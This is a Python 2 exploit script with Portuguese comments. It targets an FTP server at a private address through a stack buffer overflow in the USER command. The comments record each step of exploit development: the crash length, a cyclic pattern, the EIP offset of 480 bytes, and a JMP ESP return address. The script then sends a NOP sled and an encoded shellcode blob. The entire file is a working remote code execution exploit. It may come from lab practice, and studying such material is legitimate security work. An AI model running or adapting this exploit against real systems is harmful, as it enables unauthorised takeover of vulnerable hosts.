#!/usr/bin/python

import socket

#define o buffer enviado
#buf = 'A' * 900

#string buf com 900 bytes
#buf = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9'

#string buf para validar o controle de EIP sendo que sao 480 bytes para chegar em EIP, 4 bytes para manipular EIP e a diferenca entre os 900 bytes do estouro da pilha seria os 900 bytes de estouro da pilha menos os 480 bytes para chegar em EIO e 4 bytes para sobrescrevelo, onde esssa diferenca sera usada para inserir o shell code
#resumindo
#900 bytes crash da aplicacao
#480 bytes + 4 = Chegamos em EIP
#416 = para o shell code em ESP,EDI (JMP ESP)
#buf = 'A' * 480 + 'B' * 4 + 'C' * ( 900 - 484)

#Encontrando endereco de retorno
#buf = 'A' * 480 + '\x4B\x77\xA6\x7C' + 'C' * ( 900 - 484)

#defini o payload/shellcode gerado
shell =  ""
shell += "\xb8\xd0\xba\xdc\xa0\xda\xc4\xd9\x74\x24\xf4\x5b\x33"
shell += "\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x93\xb4\x3e"
shell += "\x55\xef\x21\x3c\x96\x0f\xb2\x21\x1e\xea\x83\x61\x44"
shell += "\x7f\xb3\x51\x0e\x2d\x38\x19\x42\xc5\xcb\x6f\x4b\xea"
shell += "\x7c\xc5\xad\xc5\x7d\x76\x8d\x44\xfe\x85\xc2\xa6\x3f"
shell += "\x46\x17\xa7\x78\xbb\xda\xf5\xd1\xb7\x49\xe9\x56\x8d"
shell += "\x51\x82\x25\x03\xd2\x77\xfd\x22\xf3\x26\x75\x7d\xd3"
shell += "\xc9\x5a\xf5\x5a\xd1\xbf\x30\x14\x6a\x0b\xce\xa7\xba"
shell += "\x45\x2f\x0b\x83\x69\xc2\x55\xc4\x4e\x3d\x20\x3c\xad"
shell += "\xc0\x33\xfb\xcf\x1e\xb1\x1f\x77\xd4\x61\xfb\x89\x39"
shell += "\xf7\x88\x86\xf6\x73\xd6\x8a\x09\x57\x6d\xb6\x82\x56"
shell += "\xa1\x3e\xd0\x7c\x65\x1a\x82\x1d\x3c\xc6\x65\x21\x5e"
shell += "\xa9\xda\x87\x15\x44\x0e\xba\x74\x01\xe3\xf7\x86\xd1"
shell += "\x6b\x8f\xf5\xe3\x34\x3b\x91\x4f\xbc\xe5\x66\xaf\x97"
shell += "\x52\xf8\x4e\x18\xa3\xd1\x94\x4c\xf3\x49\x3c\xed\x98"
shell += "\x89\xc1\x38\x0e\xd9\x6d\x93\xef\x89\xcd\x43\x98\xc3"
shell += "\xc1\xbc\xb8\xec\x0b\xd5\x53\x17\xdc\x1a\x0b\x17\x20"
shell += "\xf3\x4e\x17\x78\xf8\xc6\xf1\x12\xee\x8e\xaa\x8a\x97"
shell += "\x8a\x20\x2a\x57\x01\x4d\x6c\xd3\xa6\xb2\x23\x14\xc2"
shell += "\xa0\xd4\xd4\x99\x9a\x73\xea\x37\xb2\x18\x79\xdc\x42"
shell += "\x56\x62\x4b\x15\x3f\x54\x82\xf3\xad\xcf\x3c\xe1\x2f"
shell += "\x89\x07\xa1\xeb\x6a\x89\x28\x79\xd6\xad\x3a\x47\xd7"
shell += "\xe9\x6e\x17\x8e\xa7\xd8\xd1\x78\x06\xb2\x8b\xd7\xc0"
shell += "\x52\x4d\x14\xd3\x24\x52\x71\xa5\xc8\xe3\x2c\xf0\xf7"
shell += "\xcc\xb8\xf4\x80\x30\x59\xfa\x5b\xf1\x69\xb1\xc1\x50"
shell += "\xe2\x1c\x90\xe0\x6f\x9f\x4f\x26\x96\x1c\x65\xd7\x6d"
shell += "\x3c\x0c\xd2\x2a\xfa\xfd\xae\x23\x6f\x01\x1c\x43\xba"

#Envia o payload/shellcode com os NOPS
buf = 'A' * 480 + '\x4B\x77\xA6\x7C' + '\x90' * (900 - 484 - len(shell)) + shell 

#cria socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#conecta no socket na porta 21
s.connect(('192.168.0.62',21))

#pega a resposta
r = s.recv(1024)

print r

#Envia um usuario de teste mais o buffer para crash da aplicacao
s.send('USER teste' + buf + '\r\n')
r = s.recv(1024)
print r


#Fecha a conexao
s.close()
